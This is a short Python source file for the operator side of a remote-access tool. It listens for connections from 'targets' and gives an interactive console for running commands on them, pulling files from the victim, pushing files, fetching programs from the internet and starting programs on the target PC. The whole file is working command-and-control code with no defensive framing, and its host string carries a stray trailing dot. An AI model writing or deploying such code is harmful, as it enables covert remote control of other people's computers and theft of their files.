import threading
import socket
import time
import json
import base64


clients=[]
host="192.168.1.6." 
port=55555
server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((host,port))
server.listen(1)

def reliable_send(message,client):
    json_message=json.dumps(message)
    client.send(json_message.encode('ascii'))

def reliable_recv(client):
    message=""
    while True:
        try:
            message=message+client.recv(1024).decode('ascii')
            return json.loads(message)
        except ValueError:
            continue

def sender(client):
    print("Running terminal...")
    while True:
        try:
            time.sleep(0.2)
            message="LOC"
            reliable_send(message,client)
            location=reliable_recv(client)
            time.sleep(0.2)
            message=input(location)

            if message[:8]=="download":
                reliable_send(message,client)
                with open(message[9:],"wb") as file:
                    message=client.recv(1024)
                    file.write(base64.b64decode(message))
            elif message=="help":
                help_message='''
                    taskkill/im (program.exe) --> Close a program
                    download (file)           --> Get a file from the target.
                    upload (file)             --> Send a file to the target.
                    get (url)                 --> Download a program from the internet
                    start (program)           --> Start a program at the targets Pc.
                    exit                      --> Close the connection
                    '''
                print(help_message)
            elif message[:6]=="upload":
                reliable_send(message,client)
                with open(message[7:],"rb") as file:
                    client.send(base64.b64encode(file.read()))

            elif message =="exit":
                reliable_send(message,client)

            else:
                reliable_send(message,client)
                message=reliable_recv(client)
                print(message)

        except:
             clients.remove(client)
             client.close()
             print("Target lost")
             break
        
def receive():
    while True:
        client, address = server.accept()
        print("Connected with {}".format(str(address)))
        clients.append(client)
        thread = threading.Thread(target=sender, args=(client,))
        thread.start()



print("Server is listening...")
receive()